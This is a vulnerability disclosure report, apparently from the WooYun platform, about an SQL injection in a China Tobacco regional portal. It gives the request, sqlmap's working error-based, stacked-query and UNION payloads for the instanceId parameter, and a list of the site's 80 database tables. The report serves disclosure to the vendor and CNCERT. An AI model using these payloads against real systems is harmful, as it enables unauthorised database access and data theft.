wybug_title: 中国烟草某分站存在SQL注入漏洞
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2015-12-15：	细节已通知厂商并且等待厂商处理中									2015-12-18：	厂商已经确认，细节仅向厂商公开									2015-12-28：	细节向核心白帽子及相关领域专家公开									2016-01-07：	细节向普通白帽子公开									2016-01-17：	细节向实习白帽子公开									2016-01-28：	细节向公众公开  简要描述：  详细说明：  
POST /hbportal/show/morepicture.jsp HTTP/1.1Content-Length: 105Content-Type: application/x-www-form-urlencodedX-Requested-With: XMLHttpRequestReferer: http://**.**.**.**Cookie: JSESSIONID=45C6618B705755CA2E6F398F4D5E53EF; JSESSIONID=B78004F9A4C291FCA0F5001FC85E9905Host: **.**.**.**Connection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21Accept: */*subpic=&formid=&instanceId=O&pageCount=0&pageId=1&titlename=


   漏洞证明：  
sqlmap resumed the following injection point(s) from stored session:---Parameter: instanceId (POST)    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: subpic=&formid=&instanceId=O' AND 5105=CONVERT(INT,(SELECT CHAR(113)+CHAR(118)+CHAR(107)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (5105=5105) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(120)+CHAR(120)+CHAR(122)+CHAR(113))) AND 'qeMM'='qeMM&pageCount=0&pageId=1&titlename=    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries (comment)    Payload: subpic=&formid=&instanceId=O';WAITFOR DELAY '0:0:5'--&pageCount=0&pageId=1&titlename=    Type: UNION query    Title: Generic UNION query (NULL) - 8 columns    Payload: subpic=&formid=&instanceId=O' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CHAR(113)+CHAR(118)+CHAR(107)+CHAR(106)+CHAR(113)+CHAR(89)+CHAR(111)+CHAR(68)+CHAR(90)+CHAR(85)+CHAR(87)+CHAR(89)+CHAR(111)+CHAR(89)+CHAR(109)+CHAR(113)+CHAR(120)+CHAR(120)+CHAR(122)+CHAR(113),NULL,NULL-- &pageCount=0&pageId=1&titlename=---back-end DBMS: Microsoft SQL Server 2000Database: hbportal[80 tables]+-------------------------------+| ID_TABLE                      || NP_FLOWFILE                   || dtproperties                  || guestbook_tab                 || guestreply_tab                || np_address_kind               || np_address_person             || np_alias_entity               || np_alias_entity               || np_app_navigation             || np_calendar_complete          || np_cedict                     || np_cms_advice                 || np_cms_data                   || np_cms_field                  || np_cms_form                   || np_cms_instance               || np_cms_permission             || np_cms_show_entity            || np_cms_showmain               || np_cms_step                   || np_cms_template               || np_cms_user                   || np_cms_workflow               || np_currtable_field            || np_currtable_select           || np_currtable_table            || np_desktop_user               || np_desktop_user               || np_doc_dreviary_manager       || np_docdepart                  || np_docfile                    || np_docpolicy                  || np_doctree                    || np_ect_event                  || np_faq_question               || np_faq_replay                 || np_faq_type_security          || np_faq_type_security          || np_group_admin                || np_group_admin                || np_group_home                 || np_group_ico                  || np_group_role                 || np_magazine_approve           || np_magazine_approve           || np_magazine_article_united    || np_magazine_article_united    || np_magazine_article_user      || np_magazine_manager           || np_magazine_type_subscription || np_magazine_type_subscription || np_magazinetype_approve       || np_magazinetype_unit          || np_module_event               || np_module_event               || np_oftenusesentence           || np_permission                 || np_personal_calendar          || np_personalcalendar           || np_phone_bm                   || np_phone_bm                   || np_popfile                    || np_role_permission            || np_role_permission            || np_ums_limit                  || np_user_ext                   || np_user_ext                   || np_user_group                 || np_user_role                  || np_vt_voteanswer              || np_vt_voteanswer              || np_wlk_wwwlinkitem            || np_wlk_wwwlinkitem            || sendedmessage                 || sysconstraints                || syssegments                   || v_all_message                 || v_all_unit                    || vnp_ums_user wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-12-18 18:08 厂商回复： CNVD确认并复现所述情况,已经转由CNCERT下发给河北分中心,由其后续协调网站管理单位处置. 最新状态： 暂无
